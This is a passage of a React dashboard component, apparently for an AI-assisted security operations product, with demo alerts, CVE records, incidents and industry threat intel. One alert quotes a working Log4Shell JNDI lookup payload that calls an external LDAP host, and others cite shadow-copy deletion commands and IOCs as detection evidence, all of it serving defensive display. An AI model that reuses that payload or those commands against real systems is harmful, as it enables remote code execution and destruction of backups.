'use client';
import React, { useState, useEffect } from 'react';

// ─── Types ────────────────────────────────────────────────────────────────────

// ─── Constants ────────────────────────────────────────────────────────────────
const SEV_COLOR = { Critical:'#f0405e', High:'#f97316', Medium:'#f0a030', Low:'#4f8fff' };

const VERDICT_STYLE = {
  TP:{c:'#f0405e',bg:'#f0405e12',label:'True Positive'},
  FP:{c:'#22d49a',bg:'#22d49a12',label:'False Positive'},
  SUS:{c:'#f0a030',bg:'#f0a03012',label:'Suspicious'},
  Pending:{c:'#6b7a94',bg:'#6b7a9412',label:'Pending'},
};
const INDUSTRIES = ['Financial Services','Healthcare','Retail & eCommerce','Manufacturing','Energy & Utilities','Government & Public Sector','Legal & Professional','Technology','Education','Telecommunications'];

// ─── Demo Data ─────────────────────────────────────────────────────────────────
const DEMO_TOOLS = [
  {id:'crowdstrike',name:'CrowdStrike',configured:true,active:true,alertCount:8},
  {id:'defender',name:'Defender',configured:true,active:true,alertCount:5},
  {id:'taegis',name:'Taegis XDR',configured:false,active:false},
  {id:'darktrace',name:'Darktrace',configured:true,active:true,alertCount:3},
  {id:'splunk',name:'Splunk',configured:true,active:true,alertCount:12},
  {id:'sentinel',name:'Sentinel',configured:true,active:true,alertCount:4},
  {id:'tenable',name:'Tenable',configured:true,active:true},
  {id:'proofpoint',name:'Proofpoint',configured:true,active:true,alertCount:2},
];

const DEMO_GAP_DEVICES = [
  {hostname:'SRV-LEGACY01',ip:'10.0.4.22',os:'Windows Server 2008',missing:['CrowdStrike Falcon','Tenable.io'],reason:'Legacy OS — agent incompatible',lastSeen:'2h ago'},
  {hostname:'laptop-MKTG07',ip:'10.0.2.87',os:'Windows 11',missing:['CrowdStrike Falcon'],reason:'User-initiated uninstall',lastSeen:'15m ago'},
  {hostname:'SRV-NAS01',ip:'10.0.3.15',os:'FreeNAS',missing:['CrowdStrike Falcon','Tenable.io','Splunk SIEM'],reason:'NAS device — no agent support',lastSeen:'5m ago'},
  {hostname:'KIOSK-LOBBY',ip:'10.0.1.200',os:'Windows 10 IoT',missing:['Tenable.io','Microsoft Defender'],reason:'IoT device — restricted access',lastSeen:'1m ago'},
  {hostname:'laptop-HR03',ip:'10.0.2.44',os:'macOS 13',missing:['CrowdStrike Falcon'],reason:'Pending deployment — ticket open',lastSeen:'30m ago'},
];

const DEMO_ALERTS = [
  {id:'a1',title:'LSASS memory access — DC01',severity:'Critical',source:'CrowdStrike',device:'DC01',user:'admin_svc',ip:'10.0.0.5',time:'09:14',verdict:'TP',confidence:98,aiReasoning:'Domain controller targeted by LSASS memory access. Service account credentials at high risk. T1003.001 — high-fidelity detection. No maintenance window active. Previous login from this account was legitimate, now accessing LSASS — strong indicator of credential dumping.',evidenceChain:['Domain controller targeted — highest value asset','Service account admin_svc used laterally across 3 hosts','T1003.001 — credential dumping technique, high-fidelity','No scheduled maintenance or admin activity logged','Sequence mirrors known Mimikatz behaviour'],aiActions:['Incident INC-0847 created and assigned to Tier 2','admin_svc account disabled (revert available)','SOC Slack #incidents channel notified','5-step runbook generated and attached'],runbookSteps:['Isolate DC01 from network immediately','Reset admin_svc credentials across all domains','Run forensic memory capture on DC01','Search SIEM for admin_svc lateral movement in last 48h','Notify CISO — potential domain compromise'],mitre:'T1003.001',incidentId:'INC-0847'},
  {id:'a2',title:'C2 beacon to 185.220.101.42:443',severity:'High',source:'Darktrace',device:'SRV-FINANCE01',ip:'185.220.101.42',time:'09:16',verdict:'TP',confidence:94,aiReasoning:'Darktrace detected anomalous HTTPS beacon with JA3 fingerprint matching known C2. IP 185.220.101.42 appears on ThreatFox with LockBit association. Beaconing interval 300s — consistent with C2 heartbeat.',evidenceChain:['IP on ThreatFox — LockBit C2','Darktrace: device deviation 96/100','JA3 fingerprint matches C2 tooling','300s beacon — classic heartbeat','Seen in sector intel 48h ago'],aiActions:['IP blocked at Zscaler perimeter','Darktrace packet capture initiated','IOC added to watchlist','SRV-FINANCE01 access restricted'],runbookSteps:['Block IP at all perimeter controls','Analyse all traffic from SRV-FINANCE01 last 72h','Check for additional beaconing hosts','Preserve memory image before isolation','Report IOC to ISG'],mitre:'T1071.001'},
  {id:'a3',title:'Scheduled task persistence — SRV-APP02',severity:'Medium',source:'Defender',device:'SRV-APP02',time:'09:22',verdict:'SUS',confidence:67,aiReasoning:'Scheduled task created outside business hours by non-standard account. Technique consistent with persistence but could be legitimate tooling. Moderate confidence — analyst review recommended.',evidenceChain:['Task created at 02:17 AM — outside business hours','Non-standard service account creator','No matching change ticket','Similar to APT29 technique','No other anomalous activity from account'],aiActions:['Alert flagged for analyst review','Task hash added to monitoring'],runbookSteps:['Review task definition and binary','Cross-reference with change management','Check account login history','If unconfirmed — isolate and investigate'],mitre:'T1053.005'},
  {id:'a4',title:'PowerShell via Windows Update',severity:'Low',source:'Splunk',device:'WS-SALES12',time:'09:31',verdict:'FP',confidence:99,aiReasoning:'PowerShell traced to Windows Update process (wuauclt.exe). Microsoft-signed certificate. KB5034441 scheduled. No malicious indicators.',evidenceChain:['Parent: wuauclt.exe — legit Windows Update','Microsoft-signed certificate','KB5034441 scheduled at 09:30','No network egress','No payload or download cradle'],aiActions:['Auto-closed — FP 99% confidence','Suppression rule created'],runbookSteps:[],mitre:'T1059.001'},
  {id:'a5',title:'Anomalous VPN login — new geography',severity:'Medium',source:'Sentinel',device:'cloud-vpn',user:'jsmith@corp',time:'09:38',verdict:'SUS',confidence:72,aiReasoning:'User jsmith logged in from Singapore — baseline is UK. 03:00 AM local time. No travel in calendar. MFA enabled but not challenged.',evidenceChain:['Baseline: London — current: Singapore','03:00 AM local time','No calendar travel entry','MFA not recently challenged','No prior Singapore login in 12 months'],aiActions:['MFA re-challenge sent','Session maintained pending response','24h enhanced monitoring applied'],runbookSteps:['Await MFA — escalate if no response in 10m','If passed — monitor for anomalies','If failed — suspend account immediately','Contact user via phone'],mitre:'T1078'},
  {id:'a6',title:'Large data exfiltration to personal cloud',severity:'High',source:'Zscaler',device:'laptop-HR03',user:'lbrown@corp',ip:'142.250.80.46',time:'10:02',verdict:'TP',confidence:88,aiReasoning:'18GB uploaded to personal Google Drive over 2 hours — 36x daily baseline. User has active resignation notice. Files include payroll directories. DLP policy triggered.',evidenceChain:['18GB — 36x user baseline','Personal Google Drive destination','Active resignation notice on file','Files: /finance/payroll/2025','DLP: PII and financial data'],aiActions:['Upload throttled via Zscaler','HR and Legal alerted','Files logged to audit trail','DLP monitoring enhanced'],runbookSteps:['Legal review of AUP breach','Preserve DLP logs','Remote wipe on departure','Brief IT on offboarding'],mitre:'T1567.002'},
  {id:'a7',title:'Ransomware IOC match — SRV-BACKUP01',severity:'Critical',source:'Taegis XDR',device:'SRV-BACKUP01',ip:'10.0.4.12',time:'10:15',verdict:'TP',confidence:96,aiReasoning:'Taegis detected file extension mass-rename (.wncry extension) combined with shadow copy deletion commands. Backup server targeted — highest priority. Pattern matches LockBit 3.0 TTPs.',evidenceChain:['Mass file rename to .wncry extension','vssadmin delete shadows executed','Backup server — critical asset','LockBit 3.0 TTP match','Lateral movement from SRV-FINANCE01 same IP range'],aiActions:['SRV-BACKUP01 isolated immediately','Incident INC-0851 created — P1','CISO and IR team notified','Forensic snapshot taken'],runbookSteps:['Isolate entire VLAN 10.0.4.0/24','Identify patient zero — check finance server','Restore from known-good offline backup','Do not pay ransom — contact IR retainer','Notify ICO within 72h if PII affected'],mitre:'T1486',incidentId:'INC-0851'},
  {id:'a8',title:'Malicious email attachment opened — Phishing',severity:'High',source:'Proofpoint',device:'WS-ACCTS04',user:'mwilson@corp',time:'10:28',verdict:'TP',confidence:91,aiReasoning:'Proofpoint quarantined email with malicious macro-enabled Excel attachment. User override-opened the quarantined attachment. DMARC fail + spoofed CFO sender. Attachment hash matches known dropper.',evidenceChain:['User override-opened quarantined attachment','DMARC fail on sender domain','Spoofed CFO: cfo@company-corp.com vs company.com','Attachment hash in VirusTotal 47/72','Macro-enabled XLSM — known dropper'],aiActions:['Attachment quarantined','User endpoint EDR scan triggered','Email chain blocked','Security awareness alert sent to team'],runbookSteps:['Isolate WS-ACCTS04 immediately','Reset mwilson credentials','Check for any macro execution logs','Hunt for dropper IOCs across estate','Phishing simulation recommendation'],mitre:'T1566.001'},
  {id:'a9',title:'Suspicious OAuth app consent — Admin tenant',severity:'High',source:'Okta',device:'cloud-identity',user:'adminfirst@corp',time:'10:44',verdict:'SUS',confidence:79,aiReasoning:'New OAuth application granted admin-level directory permissions without change review. App publisher unverified. Consent granted by an admin account with no prior app authorisation history — potential OAuth phishing (consent grant attack).',evidenceChain:['OAuth app granted Directory.ReadWrite.All','Publisher domain: unverified','Granted by account with no prior app approvals','No change ticket for this application','Similar TTPs to Midnight Blizzard'],aiActions:['App access suspended pending review','Admin account placed on watchlist','Conditional access policy tightened'],runbookSteps:['Revoke application consent immediately','Audit all data accessed by app in last 24h','Review admin account login history','Enforce admin consent workflow in Azure AD','Hunt for similar OAuth apps across tenant'],mitre:'T1528'},
  {id:'a10',title:'Critical vulnerability exploitation attempt — Log4Shell',severity:'Critical',source:'Elastic',device:'SRV-WEB02',ip:'45.33.32.156',time:'11:02',verdict:'TP',confidence:97,aiReasoning:'Elastic SIEM detected Log4Shell (CVE-2021-44228) exploitation string in HTTP User-Agent header targeting SRV-WEB02 Java application. Source IP on Shodan as known exploit scanner. Payload attempting JNDI LDAP callback to attacker-controlled server.',evidenceChain:['Log4Shell JNDI payload in User-Agent: ${jndi:ldap://45.33.32.156/a}','Source IP flagged on Shodan as exploit scanner','Java application on SRV-WEB02 uses Log4j 2.14.0 (vulnerable)','LDAP callback attempt to external IP detected','Pattern matches automated exploit kit'],aiActions:['WAF rule deployed — payload blocked','SRV-WEB02 Log4j emergency patch queued','Source IP blocked at perimeter','Incident INC-0852 created'],runbookSteps:['Emergency patch Log4j to 2.17.1+','Check for successful JNDI callbacks in last 72h','Audit all internet-facing Java apps','Deploy WAF rule across all load balancers','Threat hunt for post-exploitation'],mitre:'T1190',incidentId:'INC-0852'},
  {id:'a11',title:'Endpoint EDR detection — Cobalt Strike beacon',severity:'Critical',source:'SentinelOne',device:'WS-DEV08',user:'rchang@corp',ip:'192.168.1.88',time:'11:19',verdict:'TP',confidence:95,aiReasoning:'SentinelOne AI detected in-memory Cobalt Strike beacon activity on developer workstation. Process injection into legitimate svchost.exe. Beacon profile matches known CS team server. Developer workstation with elevated privileges — high lateral movement risk.',evidenceChain:['Cobalt Strike process injection: malware→svchost.exe','In-memory beacon — no disk artefact (fileless)','CS team server profile match','Developer account has domain admin','Outbound C2 to new domain registered 3 days ago'],aiActions:['WS-DEV08 isolated immediately','Process killed and memory dump taken','rchang credentials reset','Incident INC-0853 P1 created'],runbookSteps:['Immediate network isolation of WS-DEV08','Full memory forensics via SentinelOne Deep Visibility','Hunt for lateral movement from rchang account','Reset all privileged credentials accessible from this host','Check CI/CD pipeline for injected code'],mitre:'T1055.002',incidentId:'INC-0853'},
  {id:'a12',title:'Carbon Black — PowerShell Empire C2 detected',severity:'High',source:'Carbon Black',device:'SRV-HR01',ip:'10.0.2.31',time:'11:33',verdict:'TP',confidence:89,aiReasoning:'Carbon Black Response detected Empire PowerShell C2 framework. Encrypted HTTP traffic to non-corporate IP. Staging behaviour consistent with post-exploitation recon phase. HR server — PII data at risk.',evidenceChain:['Empire PowerShell C2 signature match','Encrypted HTTP to non-corporate IP: 92.63.197.44','AMSI bypass attempted','HR server — contains employee PII','Process chain: outlook.exe → powershell.exe → network'],aiActions:['Host isolated via Carbon Black Response','Kill switch deployed on CB agent','HR data access logged for DPA purposes','NCSC reported — GDPR breach assessment started'],runbookSteps:['Isolate SRV-HR01','Identify initial access vector — suspect phishing email','Preserve logs for ICO potential notification','Hunt for Empire agents across estate','Engage DPO for GDPR 72h assessment'],mitre:'T1059.001'},
  {id:'a13',title:'Vulnerability scan — Critical CVE on exposed service',severity:'High',source:'Tenable',device:'SRV-EXTERNAL01',ip:'203.0.113.42',time:'11:45',verdict:'TP',confidence:92,aiReasoning:'Tenable.io identifies CVE-2024-1709 (ConnectWise ScreenConnect auth bypass, CVSS 10.0) on internet-facing server. CISA KEV listed. Active exploitation in the wild. Immediate patching required.',evidenceChain:['CVE-2024-1709 CVSS 10.0 — CISA KEV listed','Internet-facing host with no WAF in front','Plugin ID 212918 — auth bypass confirmed','Exploit PoC publicly available','Active exploitation confirmed by CISA'],aiActions:['Critical vuln ticket raised — P1 SLA 24h','Firewall rule applied to restrict access','Patch notification sent to ops team'],runbookSteps:['Apply patch immediately — CVE-2024-1709','If patch not possible: block external access','Verify no exploitation occurred in last 14 days','Deploy WAF rule as compensating control','Rescan after patch to verify remediation'],mitre:'T1190'},
  {id:'a14',title:'QRadar SIEM — Insider threat data staging',severity:'High',source:'QRadar',device:'WS-FIN22',user:'tpatel@corp',ip:'10.1.5.22',time:'12:01',verdict:'SUS',confidence:76,aiReasoning:'QRadar correlated multiple events: unusual after-hours file access, large archive creation, USB device insertion, and internal IP scanning. Pattern matches pre-exfiltration staging. User is on PIP — HR flag.',evidenceChain:['After-hours file access to /finance/budgets — 2am','7z archive created: company_data.7z (3.4GB)','USB device inserted 02:14','Internal IP scan from WS-FIN22 03:00','HR flag: user on performance improvement plan'],aiActions:['DLP alert raised','USB activity flagged for HR review','Account placed on enhanced monitoring','Legal briefed on potential IP theft'],runbookSteps:['Preserve forensic image of WS-FIN22','Brief HR and Legal before any user contact','Review DLP logs for data classification','Check USB device serial number against asset register','Prepare evidence chain for potential proceedings'],mitre:'T1074.001'},
]

const DEMO_VULNS = [
  {id:'v1',cve:'CVE-2024-21413',title:'Microsoft Outlook NTLM Credential Leak',severity:'Critical',cvss:9.8,prevalence:94,affected:23,affectedDevices:['laptop-CFO01','laptop-SALES03','WS-HR01','+ 20 more'],description:'Critical RCE/NTLM relay vulnerability in Microsoft Outlook. Exploitable via malicious email links without user interaction. Actively exploited in the wild by APT actors.',remediation:['Apply Microsoft patch KB5002112 immediately','Enable Windows Credential Guard on all endpoints','Block outbound SMB (TCP 445) at perimeter','Add to email gateway URL filtering rules','Consider blocking external hyperlinks in email until patched'],kev:true,patch:'KB5002112'},
  {id:'v2',cve:'CVE-2024-3400',title:'PAN-OS Command Injection — GlobalProtect',severity:'Critical',cvss:10.0,prevalence:88,affected:2,affectedDevices:['FW-EDGE01','FW-BRANCH01'],description:'Critical command injection in Palo Alto GlobalProtect gateway. CVSSv3 10.0. Exploited by nation-state actors (UNC5221) in the wild. Full command execution possible.',remediation:['Apply PAN-OS patch 11.1.2-h3 or later immediately','Enable Threat Prevention signatures for CVE-2024-3400','Review GlobalProtect logs for IOCs: sessions from unexpected IPs','Isolate affected firewalls if patch cannot be applied immediately','Contact Palo Alto PSIRT if compromise suspected'],kev:true,patch:'PAN-OS 11.1.2-h3'},
  {id:'v3',cve:'CVE-2024-27198',title:'JetBrains TeamCity Auth Bypass',severity:'Critical',cvss:9.8,prevalence:76,affected:3,affectedDevices:['SRV-CICD01','SRV-BUILD02','SRV-BUILD03'],description:'Authentication bypass in JetBrains TeamCity build server. Allows unauthenticated remote code execution. APT29 (Cozy Bear) actively exploiting to compromise CI/CD pipelines and inject malicious build artifacts.',remediation:['Upgrade TeamCity to version 2023.11.4 immediately','If upgrade not possible, restrict TeamCity to VPN access only','Review all build logs for unexpected plugin installations','Audit service account permissions used by TeamCity','Check build artifacts for unexpected modifications'],kev:true,patch:'TeamCity 2023.11.4'},
  {id:'v4',cve:'CVE-2023-46805',title:'Ivanti ICS/IPS Authentication Bypass',severity:'Critical',cvss:8.2,prevalence:71,affected:1,affectedDevices:['IVANTI-GW01'],description:'Authentication bypass affecting Ivanti Connect Secure and Policy Secure. Chained with CVE-2024-21887 for RCE. Mass exploitation observed. CISA emergency directive issued.',remediation:['Apply Ivanti patch immediately or take gateway offline','Run Ivanti Integrity Checker Tool','Reset all passwords for users authenticated via affected gateway','Review SIEM for suspicious authentication patterns','Consider replacing with alternative VPN solution if persistent issues'],kev:true},
  {id:'v5',cve:'CVE-2024-1708',title:'ConnectWise ScreenConnect Path Traversal',severity:'Critical',cvss:8.4,prevalence:65,affected:1,affectedDevices:['SCREENCONNECT01'],description:'Path traversal vulnerability in ConnectWise ScreenConnect. Allows unauthenticated RCE. Ransomware groups actively using this to gain initial access to MSP-managed networks.',remediation:['Upgrade ScreenConnect to version 23.9.8 or later','If upgrade delayed, disable external access until patched','Review ScreenConnect audit logs for unauthorized sessions','Check all managed endpoints for unauthorized ScreenConnect sessions','Alert clients if you are an MSP using ScreenConnect'],kev:true,patch:'ScreenConnect 23.9.8'},
  {id:'v6',cve:'CVE-2024-21762',title:'Fortinet FortiOS OOB Write — SSL VPN',severity:'Critical',cvss:9.6,prevalence:82,affected:2,affectedDevices:['FORTI-EDGE01','FORTI-DR01'],description:'Out-of-bounds write in Fortinet FortiOS SSL VPN. No authentication required. Likely exploited in the wild. Fortinet issued emergency patch.',remediation:['Upgrade FortiOS to 7.4.3 or 7.2.7 immediately','Disable SSL VPN if upgrade cannot be applied immediately','Monitor for IOCs: unexpected admin account creation, config changes','Check FortiGuard subscription is active and updated','Verify all admin accounts — delete any unrecognised'],kev:true,patch:'FortiOS 7.4.3'},
  {id:'v7',cve:'CVE-2024-20767',title:'Adobe ColdFusion RCE — Public Files',severity:'High',cvss:8.7,prevalence:58,affected:4,affectedDevices:['SRV-WEB01','SRV-WEB02','SRV-WEB03','SRV-WEB04'],description:'Remote code execution in Adobe ColdFusion via the administrator panel. Allows arbitrary file read and potential RCE. Web-facing ColdFusion servers at significant risk.',remediation:['Apply Adobe patch APSB24-14 immediately','If ColdFusion admin interface is internet-facing, take offline','Restrict admin interface to management VLAN only','Enable WAF rules for ColdFusion exploit attempts','Review web server logs for scanning activity'],kev:false,patch:'APSB24-14'},
  {id:'v8',cve:'CVE-2024-22024',title:'Ivanti Connect Secure XXE Injection',severity:'High',cvss:8.3,prevalence:52,affected:1,affectedDevices:['IVANTI-GW01'],description:'XXE injection in Ivanti Connect Secure and Neurons for ZTA. Can be used to access sensitive files. Affects same device-2023-46805 — prioritise remediation.',remediation:['Covered by same Ivanti patch-2023-46805','Verify patch applied to both vulnerabilities simultaneously','Run Ivanti ICT scan post-patching','Monitor for XML-related errors in gateway logs'],kev:false},
  {id:'v9',cve:'CVE-2024-27956',title:'WordPress Automatic Plugin SQL Injection',severity:'High',cvss:9.8,prevalence:45,affected:2,affectedDevices:['SRV-WEB02','SRV-WEB03'],description:'Critical SQL injection in WordPress Automatic plugin. Allows unauthenticated attackers to create admin users and upload webshells. Rapidly weaponised.',remediation:['Update Automatic plugin to version 3.92.1 or later','Scan WordPress installations for unauthorized admin accounts','Check for uploaded files in wp-content/uploads — remove suspicious','Enable WAF plugin (Wordfence) or cloud WAF rule','Consider disabling XML-RPC if not needed'],kev:false,patch:'Automatic plugin 3.92.1'},
  {id:'v10',cve:'CVE-2023-48788',title:'Fortinet EMS SQL Injection — RCE',severity:'High',cvss:9.3,prevalence:38,affected:1,affectedDevices:['EMS-SERVER01'],description:'SQL injection in Fortinet FortiClientEMS. Enables RCE without authentication. Widely exploited against internet-exposed EMS servers. DoJ charged attackers exploiting this.',remediation:['Upgrade FortiClientEMS to 7.2.3 or 7.0.10','Restrict EMS to internal network — no direct internet exposure','Check EMS logs for unauthorized SQL activity','Audit all managed endpoint agents for unexpected configuration changes'],kev:true,patch:'FortiClientEMS 7.2.3'},
];

const DEMO_INCIDENTS = [
  {id:'INC-0847',title:'Domain Controller Compromise — admin_svc Credential Dump',severity:'Critical',status:'Active',created:'2026-03-22 09:14',updated:'2026-03-22 09:47',alertCount:4,devices:['DC01','SRV-FINANCE01','laptop-CFO01'],mitreTactics:['Initial Access','Credential Access','Lateral Movement'],aiSummary:'Multi-stage credential theft attack targeting domain infrastructure. Attacker gained initial access via spear-phish, executed LSASS dump on DC01, and used compromised admin_svc credentials to move laterally to SRV-FINANCE01. C2 beacon detected and blocked. Domain credentials at high risk — immediate reset recommended.',timeline:[
    {t:'09:14',actor:'AI',action:'Initial alert correlated',detail:'LSASS access on DC01 — Incident created and Tier 2 assigned'},
    {t:'09:15',actor:'AI',action:'admin_svc account disabled',detail:'Auto-response: account suspended across all domain controllers'},
    {t:'09:16',actor:'AI',action:'C2 traffic blocked',detail:'IP 185.220.101.42 blocked at Zscaler perimeter. Darktrace PCAP initiated'},
    {t:'09:22',actor:'Analyst',action:'Confirmed TP — escalated to Incident Commander',detail:'IR team engaged. DC01 isolated. Forensic image requested'},
    {t:'09:31',actor:'AI',action:'Lateral movement path mapped',detail:'admin_svc lateral path: laptop-CFO01 → DC01 → SRV-FINANCE01'},
    {t:'09:47',actor:'AI',action:'Updated kill chain analysis',detail:'Full attack timeline generated. MITRE ATT&CK mapping complete'},
  ]},
  {id:'INC-0846',title:'Suspected Insider Threat — Data Exfiltration',severity:'High',status:'Contained',created:'2026-03-22 08:45',updated:'2026-03-22 09:12',alertCount:3,devices:['laptop-HR03','cloud-email'],mitreTactics:['Collection','Exfiltration'],aiSummary:'HR employee with active resignation notice uploaded 18GB of payroll and personnel data to personal Google Drive. Email forwarding rule discovered directing inbox to personal Gmail. DLP policies enforced, legal team notified. Data exfiltration contained — no external breach confirmed.',timeline:[
    {t:'08:45',actor:'AI',action:'DLP alert correlated with HR data',detail:'Zscaler flagged 18GB upload. HR system integration confirmed resignation notice'},
    {t:'08:47',actor:'AI',action:'Upload throttled',detail:'Zscaler policy updated to block personal cloud storage for this user'},
    {t:'09:00',actor:'AI',action:'Email forwarding rule discovered and deleted',detail:'3,200 emails forwarded to personal Gmail in 48h. Rule removed. HR and Legal auto-notified'},
    {t:'09:12',actor:'Analyst',action:'Incident contained — legal review underway',detail:'IT forensics preserving audit trail. Device remote wipe scheduled for departure date'},
  ]},
];

const DEMO_INTEL_BY_INDUSTRY = {
  'Financial Services':[
    {id:'i1',title:'TA505 Targeting UK Banks — Cobalt Strike Deployment',summary:'TA505 (Clop ransomware affiliate) observed targeting UK financial institutions with spear-phishing campaigns delivering Cobalt Strike beacons via fake SWIFT notification emails. 3 UK banks confirmed compromised in the last 14 days.',severity:'Critical',source:'NCSC & ThreatFox',time:'2h ago',iocs:['185.220.101.42','hxxps://swift-notification[.]com','cobalt-cs-payload-2024.exe'],mitre:'T1566.001',industrySpecific:true},
    {id:'i2',title:'QakBot Resurgence — Banking Trojans via PDF Lures',summary:'QakBot (QBot) back in circulation after law enforcement takedown. New infrastructure and updated PDF lure themed around invoice disputes. Financial sector primary target. High evasion capability — bypasses standard email security.',severity:'High',source:'CISA KEV',time:'6h ago',iocs:['invoice-dispute-2024.pdf','hxxp://qakbot-new[.]ru'],mitre:'T1566.001',industrySpecific:true},
    {id:'i3',title:'SWIFT Customer Security Programme — Audit Deadline',summary:'SWIFT CSP mandatory controls attestation deadline approaching. Ensure your SWIFT connector environments comply with CSP 2024 requirements, particularly around multi-factor authentication and anomaly detection integration.',severity:'Medium',source:'SWIFT ISAC',time:'1d ago',industrySpecific:true},
  ],
  'Healthcare':[
    {id:'i4',title:'Rhysida Ransomware Targeting NHS Trusts',summary:'Rhysida ransomware group actively targeting NHS Trusts and healthcare providers. Gain access via phishing, move laterally to clinical systems, and exfiltrate patient data before encryption. 4 NHS Trusts hit in last 30 days.',severity:'Critical',source:'NCSC Health Alert',time:'4h ago',iocs:['rhysida-ransom.onion','185.181.60.92','health-tender-2024.exe'],mitre:'T1486',industrySpecific:true},
    {id:'i5',title:'DICOM Vulnerability — Medical Imaging Systems Exposed',summary:'Multiple DICOM-compliant medical imaging systems found to have patient data exposed on the internet without authentication. Check for internet-exposed DICOM servers on port 104. Over 1,000 UK systems found exposed in recent scan.',severity:'High',source:'Cynerio Research',time:'1d ago',industrySpecific:true},
  ],
  'default':[
    {id:'def1',title:'CISA KEV Update — 3 New Actively Exploited CVEs',summary:'CISA added CVE-2024-21413 (Outlook), CVE-2024-3400 (PAN-OS), and CVE-2024-27198 (TeamCity) to Known Exploited Vulnerabilities catalog. All three being actively exploited in the wild. Patch deadline: 72 hours.',severity:'Critical',source:'CISA KEV',time:'3h ago',iocs:[],mitre:'',industrySpecific:false},
    {id:'def2',title:'LockBit 3.0 Infrastructure Resurfaces Post-Takedown',summary:'LockBit 3.0 operational infrastructure identified on new IP ranges following law enforcement takedown. Group recruiting new affiliates and offering updated locker with improved evasion. Healthcare and financial sectors primary targets.',severity:'High',source:'ThreatFox',time:'8h ago',iocs:['185.220.101.0/24','lockbit-ransom3.com'],mitre:'T1486',industrySpecific:false},
    {id:'def3',title:'ThreatFox IOC Feed — 847 New C2 Indicators',summary:'ThreatFox published 847 new command-and-control indicators in the last 24 hours. Predominant malware families: AsyncRAT, RedLine Stealer, Cobalt Strike. Recommend enriching alert triage rules with updated IOC set.',severity:'Medium',source:'ThreatFox',time:'1h ago',industrySpecific:false},
    {id:'def4',title:'URLhaus Phishing Kit — 23 New Malicious Domains',summary:'23 newly registered domains identified distributing credential harvesting kits mimicking Microsoft 365, DocuSign, and SharePoint. All domains registered in last 72h with low reputation.',severity:'Medium',source:'URLhaus',time:'2h ago',industrySpecific:false},
  ],
};

// ─── Helpers ──────────────────────────────────────────────────────────────────
function SevBadge({sev}) {
  return <span style={{fontSize:'0.5rem',fontWeight:800,padding:'1px 6px',borderRadius:3,color:'#fff',background:SEV_COLOR[sev]}}>{sev.toUpperCase()}</span>;
}

// ─── Modal ────────────────────────────────────────────────────────────────────

function Modal({title,onClose,children}) {
  return (
    <div style={{position:'fixed',inset:0,background:'rgba(0,0,0,0.75)',zIndex:200,display:'flex',alignItems:'center',justifyContent:'center',padding:20}} onClick={onClose}>
      <div style={{background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:16,maxWidth:700,width:'100%',maxHeight:'85vh',overflow:'auto',position:'relative'}} onClick={e=>e.stopPropagation()}>
        <div style={{display:'flex',alignItems:'center',padding:'16px 20px',borderBottom:'1px solid #141820',position:'sticky',top:0,background:'var(--wt-card2)',zIndex:10}}>
          <span style={{fontWeight:700,fontSize:'0.92rem'}}>{title}</span>
          <button onClick={onClose} style={{marginLeft:'auto',background:'none',border:'none',color:'var(--wt-muted)',cursor:'pointer',fontSize:'1.2rem',lineHeight:1}}>×</button>
        </div>
        <div style={{padding:20}}>{children}</div>
      </div>
    </div>
  );
}

// ─── Stat Card ────────────────────────────────────────────────────────────────

function StatCard({val,label,sub,color,onClick}) {
  return (
    <div onClick={onClick} style={{padding:'14px 12px',background:'var(--wt-card)',border:'1px solid #141820',borderRadius:10,textAlign:'center',cursor:onClick?'pointer':'default',transition:'border-color .15s'}}
      onMouseEnter={e=>{ if(onClick)(e.currentTarget).style.borderColor='#4f8fff40'; }}
      onMouseLeave={e=>{ (e.currentTarget).style.borderColor='var(--wt-border)'; }}>
      <div style={{fontSize:'1.5rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color,letterSpacing:-1}}>{val}</div>
      <div style={{fontSize:'0.62rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.4px',marginTop:2}}>{label}</div>
      {sub && <div style={{fontSize:'0.56rem',color:'var(--wt-dim)',marginTop:2}}>{sub}</div>}
      {onClick && <div style={{fontSize:'0.48rem',color:'#4f8fff',marginTop:4}}>click to view →</div>}
    </div>
  );
}

// ─── Paywall Gate ────────────────────────────────────────────────────────────

function GateWall({ feature, requiredTier, children, userTier }) {
  const levels = {community:0,team:1,business:2,mssp:3};
  if ((levels[userTier]||0) >= levels[requiredTier]) return (<>{children}</>);
  const tierColors = {team:'#4f8fff',business:'#22d49a',mssp:'#8b6fff'};
  const tierPrices = {team:'£49/seat',business:'£199/mo',mssp:'£799/mo'};
  return (
    <div style={{position:'relative',overflow:'hidden',borderRadius:12}}>
      <div style={{filter:'blur(3px)',opacity:0.3,pointerEvents:'none',userSelect:'none'}}>{children}</div>
      <div style={{position:'absolute',inset:0,display:'flex',flexDirection:'column',alignItems:'center',justifyContent:'center',background:'rgba(5,5,8,0.85)',backdropFilter:'blur(2px)',borderRadius:12,border:`1px solid ${tierColors[requiredTier]}20`}}>
        <div style={{fontSize:'1.4rem',marginBottom:8}}>🔒</div>
        <div style={{fontSize:'0.82rem',fontWeight:700,marginBottom:4}}>{feature}</div>
        <div style={{fontSize:'0.72rem',color:'var(--wt-muted)',marginBottom:14,textAlign:'center',maxWidth:260}}>Available on {requiredTier.charAt(0).toUpperCase()+requiredTier.slice(1)} plan and above</div>
        <a href='/pricing' style={{padding:'8px 20px',borderRadius:8,background:tierColors[requiredTier],color:'#fff',fontSize:'0.76rem',fontWeight:700,textDecoration:'none',display:'inline-block'}}>Upgrade to {requiredTier.charAt(0).toUpperCase()+requiredTier.slice(1)} — {tierPrices[requiredTier]}</a>
      </div>
    </div>
  );
}

// ─── AI Remediation Output Renderer ─────────────────────────────────────────

function RemediationOutput({ text }) {
  const [copied, setCopied] = useState(null);

  function copyCode(code, id) {
    navigator.clipboard.writeText(code).then(()=>{
      setCopied(id);
      setTimeout(()=>setCopied(null), 2000);
    });
  }

  // Parse text into sections. Detect: ALL-CAPS headings, KQL QUERY N:, code blocks
  const lines = text.split('\n');
  const blocks = [];
  let codeBuffer = [];
  let inCode = false;
  let codeId = 0;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const trimmed = line.trim();
    if (!trimmed) { if (!inCode) continue; }

    // Detect code block start: line ending in { or contains | where or | search or | stats
    const endsWithOp = ['{','}',';','|'].some(c=>trimmed.endsWith(c)); const isCodeLine = endsWithOp || /^(DeviceProcess|DeviceNetwork|Security|Identity|Cloud|Mailbox|source=|index=)/.test(trimmed) || (inCode && trimmed.length > 0);
